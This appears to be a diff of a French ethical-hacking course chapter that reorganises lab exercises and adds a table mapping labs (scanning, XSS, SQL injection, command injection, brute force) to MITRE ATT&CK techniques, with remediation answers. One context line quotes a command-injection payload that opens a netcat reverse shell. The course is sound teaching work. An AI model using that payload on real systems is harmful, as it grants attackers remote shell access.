@@ -76,20 +76,6 @@ techniques-de-hacking-niveau-1/      # Dépôt du cours (RACINE)
     └── hors-serie/                  # Dockerfile + code source KillChainAgent
 ```
 
-```mermaid
-flowchart LR
-    A["1. git clone"] --> B["2. cd techniques-de-hacking-niveau-1"]
-    B --> C["3. source env.sh"]
-    C --> D["4. docker compose up -d --build &lt;cible&gt;"]
-    D --> E["5. cd rendu_labs/jour-0X"]
-    E --> F["6. Travailler !"]
-    F --> G{"Bloqué ?"}
-    G -->|"Oui"| H["cat labs_resolution/jour-0X/*.sh"]
-    G -->|"Non"| I["Passer au lab suivant"]
-```
-
-**Fig 1b** — Workflow type d'un lab : cloner, sourcer, lancer le conteneur, travailler dans `rendu_labs/`, consulter `labs_resolution/` en cas de blocage.
-
 ## A.3 Lancement des conteneurs
 
 ```bash
@@ -339,6 +325,54 @@ flowchart LR
 ```
 
 **Fig 5c** — Chaîne d'attaque Command Injection vers reverse shell : l'injection de `; nc -e /bin/sh <KALI> 4444` transforme un `ping` non sécurisé en shell distant exploitable.
+
+---
+
+## Tableau de référence : Outils et techniques des labs
+
+Ce tableau résume les **outils** et les **techniques d'attaque** utilisés dans les exercices pratiques de cette séance. Chaque lab est associé à sa tactique [MITRE ATT&CK](https://attack.mitre.org/) correspondante.
+
+| Lab | Outil principal | Vulnérabilité / Méthode | ATT&CK |
+|-----|----------------|-------------------------|--------|
+| 1.1 — Scan | nmap, gobuster, curl | Scan de ports, énumération web | [TA0043](https://attack.mitre.org/tactics/TA0043/) Reconnaissance — [T1046](https://attack.mitre.org/techniques/T1046/) |
+| 1.2 — XSS | navigateur, curl | Cross-Site Scripting (Reflected + Stored) | [T1189](https://attack.mitre.org/techniques/T1189/) Drive-by Compromise |
+| 1.3 — SQLi | sqlmap | SQL Injection automatisée | [T1190](https://attack.mitre.org/techniques/T1190/) Exploit Public-Facing Application |
+| 1.4 — CMDi | netcat, msfvenom, meterpreter | Command Injection → Reverse Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) Unix Shell |
+| 1.5 — Hash | sqlmap, john | SQLi avancée + craquage de hashs | [T1190](https://attack.mitre.org/techniques/T1190/) + [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
+| 1.6 — Hydra | hydra, dictionnaire | Brute-force de formulaire d'authentification | [T1110](https://attack.mitre.org/techniques/T1110/) Brute Force |
+
+---
+
+## Exercices
+
+### Exercice 1 : Couche ATT&CK Navigator
+
+**Énoncé :** Créez une couche avec [T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1203](https://attack.mitre.org/techniques/T1203/). Exportez en JSON.
+
+<details><summary><strong>Solution</strong></summary>
+1. https://mitre-attack.github.io/attack-navigator/ → New Layer → Enterprise v15
+2. Ajouter les 5 techniques, colorer (rouge = testé)
+3. Download as JSON
+</details>
+
+### Exercice 2 : Mapping WannaCry
+
+**Énoncé :** WannaCry (2017) utilisait EternalBlue. Quelles techniques ATT&CK ?
+
+<details><summary><strong>Solution</strong></summary>
+- EternalBlue (CVE-2017-0144) → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
+</details>
+
+### Exercice 3 : Mini-rapport DVWA
+
+**Énoncé :** Rédigez 4 fiches (une par vulnérabilité) avec type, ATT&CK, impact, remédiation.
+
+<details><summary><strong>Solution</strong></summary>
+1. XSS → [T1189](https://attack.mitre.org/techniques/T1189/) → htmlspecialchars() + CSP
+2. CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) → Token anti-CSRF
+3. SQLi → [T1190](https://attack.mitre.org/techniques/T1190/) → Requêtes préparées PDO
+4. CMDi → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) → escapeshellcmd()
+</details>
 
 ---
 
@@ -1160,39 +1194,6 @@ Ce chapitre vous a fait parcourir les **6 phases d'une attaque web complète**, 
 
 ---
 
-## Exercices
-
-### Exercice 1 : Couche ATT&CK Navigator
-
-**Énoncé :** Créez une couche avec [T1046](https://attack.mitre.org/techniques/T1046/), [T1189](https://attack.mitre.org/techniques/T1189/), [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/), [T1203](https://attack.mitre.org/techniques/T1203/). Exportez en JSON.
-
-<details><summary><strong>Solution</strong></summary>
-1. https://mitre-attack.github.io/attack-navigator/ → New Layer → Enterprise v15
-2. Ajouter les 5 techniques, colorer (rouge = testé)
-3. Download as JSON
-</details>
-
-### Exercice 2 : Mapping WannaCry
-
-**Énoncé :** WannaCry (2017) utilisait EternalBlue. Quelles techniques ATT&CK ?
-
-<details><summary><strong>Solution</strong></summary>
-- EternalBlue (CVE-2017-0144) → [T1210](https://attack.mitre.org/techniques/T1210/) ([TA0008](https://attack.mitre.org/tactics/TA0008/)), DoublePulsar → [T1543.003](https://attack.mitre.org/techniques/T1543/003/) ([TA0003](https://attack.mitre.org/tactics/TA0003/)), Chiffrement → [T1486](https://attack.mitre.org/techniques/T1486/) ([TA0014](https://attack.mitre.org/tactics/TA0014/))
-</details>
-
-### Exercice 3 : Mini-rapport DVWA
-
-**Énoncé :** Rédigez 4 fiches (une par vulnérabilité) avec type, ATT&CK, impact, remédiation.
-
-<details><summary><strong>Solution</strong></summary>
-1. XSS → [T1189](https://attack.mitre.org/techniques/T1189/) → htmlspecialchars() + CSP
-2. CSRF → [T1203](https://attack.mitre.org/techniques/T1203/) → Token anti-CSRF
-3. SQLi → [T1190](https://attack.mitre.org/techniques/T1190/) → Requêtes préparées PDO
-4. CMDi → [T1059.004](https://attack.mitre.org/techniques/T1059/004/) → escapeshellcmd()
-</details>
-
----
-
 ## Dépannage rapide
 
 | Problème | Cause probable | Solution |
@@ -1224,96 +1225,4 @@ Ce chapitre vous a fait parcourir les **6 phases d'une attaque web complète**, 
 
 ---
 
-## Plan du cours — Vue d'ensemble
 
-```mermaid
-flowchart TB
-    J1["JOUR-01<br/>Introduction<br/>XSS · CSRF · SQLi · CMDi · Brute-force"] --> J2["JOUR-02<br/>Pentest<br/>vsftpd · Samba · MITM · Nessus"]
-    J2 --> J3["JOUR-03<br/>Contournement<br/>BOF · WAF Bypass · Trojan"]
-    J3 --> J4["JOUR-04<br/>Contre-mesures<br/>Hardening · ELK SOC"]
-    J4 --> J5["JOUR-05<br/>Reporting<br/>Forensique · Génération rapport"]
-```
-
-**Fig 6** — Plan du cours en 5 jours : chaque jour s'appuie sur les acquis du précédent, de l'initiation (J1) au reporting professionnel (J5).
-
-## Rapport — Petit cours de synthèse
-
-### Architecture du dépôt
-
-```
-techniques-de-hacking-niveau-1/
-├── rendu_labs/            # 📁 Votre dossier de rendu
-│   └── jour-0X/           #   Déposez vos travaux ici
-├── labs_resolution/       # 🔥 CORRIGÉS — solutions complètes
-│   └── jour-0X/           #   Scripts, scans, exploits résolus
-├── env.sh                 # Variables d'environnement (sourcer avant les labs)
-├── docker-compose.yml     # Orchestration des 7 conteneurs
-├── docker/                # Dockerfiles de chaque conteneur
-├── img/                   # Schémas et figures
-├── JOUR-0X-*.md           # Supports de cours (5 jours)
-└── extra/                 # Projets complémentaires
-```
-
-### Correspondance lab → technique ATT&CK
-
-| Lab | Technologie | ATT&CK |
-|-----|-------------|--------|
-| 1.1 Scan | DVWA | T1046 Network Scanning |
-| 1.2 XSS | DVWA | T1189 Drive-by Compromise |
-| 1.3 SQLi | DVWA + sqli-app | T1190 Exploit Public App |
-| 1.4 CMDi | DVWA | T1059.004 Unix Shell |
-| 1.5 SQLi avancée | sqli-app | T1190 + T1110.001 Password Cracking |
-| 1.6 Brute-force | DVWA | T1110 Brute Force |
-| 2.1 Recon | Metasploitable | T1046 + T1595 |
-| 2.2 vsftpd | Metasploitable | T1190 CVE-2011-2523 |
-| 2.3 Samba | Metasploitable | T1210 CVE-2007-2447 |
-| 2.4 Persistance | Metasploitable | T1098.004 SSH Key |
-| 2.5 MITM | DVWA | T1557.002 ARP Poisoning |
-| 2.6 Nessus | Metasploitable | T1046 + T1595 |
-| 3.1 BOF | buffovf-target | T1068 Privilege Escalation |
-| 3.2 WAF | waf-target | T1562.001 Impair Defenses |
-| 3.4 Trojan | Windows 10 | T1204.002 + T1071.001 |
-| 4.1 Hardening | secure-linux | M1051 + M1018 + M1037 + M1036 |
-| 4.2 ELK | Tous | Détection SOC |
-| 5.1 Forensique | forensic-victim | T1190 → T1059 → T1505 → T1548 |
-| 5.2 Rapport | local | Générateur Python |
-
-### Schémas ajoutés dans ce document
-
-| Fig | Technique | Description |
-|-----|-----------|------------|
-| Fig 1 | Topologie | 7 conteneurs cibles |
-| Fig 2 | MITRE ATT&CK | Chaîne des 14 tactiques |
-| Fig 3 | Mapping | Attaques → techniques |
-| Fig 4 | Profils | Types de hackers |
-| Fig 5 | XSS | Flux XSS réfléchie |
-| Fig 5b | SQLi UNION | Injection UNION |
-| Fig 5c | CMDi | Command → Reverse shell |
-| Fig 5d | Brute-force | Hydra en boucle |
-| Fig 6 | Plan | Vue d'ensemble 5 jours |
-
-### Où trouver les corrigés ?
-
-```bash
-# Les scripts résolus se trouvent dans labs_resolution/
-ls labs_resolution/jour-01/
-# Exemple : copier le corrigé du lab XSS dans votre dossier de travail
-cp labs_resolution/jour-01/lab_xss.sh rendu_labs/jour-01/
-```
-
-### Avant chaque lab
-
-```bash
-# 0. Créer votre dossier de rendu pour ce jour (une seule fois)
-mkdir -p rendu_labs/jour-0X
-# 1. Charger les variables d'environnement
-cd /chemin/vers/techniques-de-hacking-niveau-1 && source env.sh
-# 2. Démarrer les conteneurs nécessaires
-docker compose up -d --build <conteneur>
-# 3. Vérifier que le service répond
-nc -z localhost <PORT> && echo "Prêt"
-# 4. Travailler dans votre dossier de rendu
-cd rendu_labs/jour-0X
-```
-
----
